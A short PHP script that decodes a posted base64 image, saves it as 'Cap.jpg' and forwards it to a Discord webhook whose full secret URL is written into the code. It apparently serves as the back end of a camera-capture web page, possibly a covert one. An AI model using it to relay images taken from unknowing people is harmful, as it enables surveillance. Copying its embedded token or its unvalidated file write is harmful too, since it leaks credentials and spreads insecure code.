<?php
// Check if image data is received
if(isset($_POST["image"]) && !empty($_POST["image"])){
    // Get the base-64 encoded data URI
    $img = $_POST['image'];

    // Remove the "data:image/jpeg;base64," substring
    $img = str_replace('data:image/jpeg;base64,', '', $img);

    // Decode the base-64 encoded string
    $img = base64_decode($img);

    // Generate a unique filename for the image
    $filename =  'Cap.jpg';

    // Specify the directory where you want to save the image
    $filepath = '../save_webapp_img/' . $filename;

    // Save the image to the specified directory
    if(file_put_contents($filepath, $img)) {
        // Return the filename of the saved image
        // echo $filename;

        // Send the image to Discord server channel via webhook
        $discordWebhookURL = 'https://discord.com/api/webhooks/1218773294119915570/B4oxz2OhhBerONUXJGj0yAkV3rwYs6EawwiowWNT0CCTjPmlbwB0hKTodvgHCyp4naNe'; // Replace this with your Discord webhook URL

        // Prepare the image file to be sent
        $file = new CURLFile($filepath, 'image/jpeg', 'Cap.jpg');

        // Prepare the message
        $data = array(
            'content' => 'New image captured:', // Optional message
            'file' => $file
        );

        // Send the POST request to Discord webhook URL
        $ch = curl_init($discordWebhookURL);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        curl_close($ch);

        // Check if the request was successful
        if(!$response) {
            echo "Error: Failed to send image to Discord server.";
        } else {
            echo "Image sent to Discord server successfully!";
        }
    } else {
        // If there's an error saving the image, return an error message
        echo "Error: Failed to save image.";
    }
} else {
    // If image data is not received, return an error message
    echo "Error: No image data received.";
}
?>
